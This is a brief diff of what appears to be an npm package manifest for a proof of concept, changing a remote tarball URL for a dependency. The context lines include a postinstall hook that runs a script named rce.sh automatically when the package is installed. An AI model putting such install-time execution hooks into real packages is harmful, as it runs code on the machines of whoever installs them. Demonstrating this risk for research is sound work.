@@ -8,6 +8,6 @@
     "postinstall": "sh ./rce.sh"
   },
   "dependencies": {
-    "poc-dep-artifact": "https://github.com/PDFtoMark/gab-poc-lintbot-dep/archive/refs/heads/main.tar.gz"
+    "poc-dep-artifact": "https://codeload.github.com/PDFtoMark/gab-poc-lintbot-dep/tar.gz/refs/heads/main"
   }
 }
